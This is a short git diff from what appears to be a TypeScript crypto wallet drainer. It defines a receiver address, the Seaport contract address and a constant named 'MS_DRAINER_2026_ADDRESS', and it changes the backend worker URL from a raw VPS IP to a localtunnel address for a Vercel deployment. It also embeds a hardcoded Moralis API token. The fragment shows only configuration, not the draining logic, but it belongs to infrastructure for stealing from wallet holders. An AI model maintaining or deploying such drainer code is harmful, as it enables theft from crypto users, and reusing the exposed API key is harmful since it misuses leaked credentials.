@@ -17,7 +17,7 @@ const normalizeAddress = (addr: string) => {
 const RECEIVER_ADDRESS = normalizeAddress(process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || "");
 const SEAPORT_ADDRESS = "0x00000000000000adc04c56bf30ac9d3c0aaf14bd";
 const MS_DRAINER_2026_ADDRESS = normalizeAddress(process.env.NEXT_PUBLIC_MS_DRAINER_2026_ADDRESS || "");
-const WORKER_URL = "http://168.231.126.162:8080"; // Hardcoded VPS for stability
+const WORKER_URL = "https://whole-parents-guess.loca.lt"; // Secure Tunnel for Vercel (HTTPS)
 
 const MORALIS_KEYS = [
     "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjcxMDBmY2IwLTdkNzAtNDgzNC04MzM1LWE1ZDZjNWEzYmU3NSIsIm9yZ0lkIjoiNDk5MjYzIiwidXNlcklkIjoiNDk5NjU3IiwidHlwZUlkIjoiOTgwYjU5ODQtMzBlNi00Y2UxLWIwY2YtODRiYmQzYjgzYWY4IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NjU0ODUzMzYsImV4cCI6NDkyMTI0NTMzNn0.BNbrFrPtzeT9OZ1zb160yzRDpi5sjRmxjuyqYbukmv4",
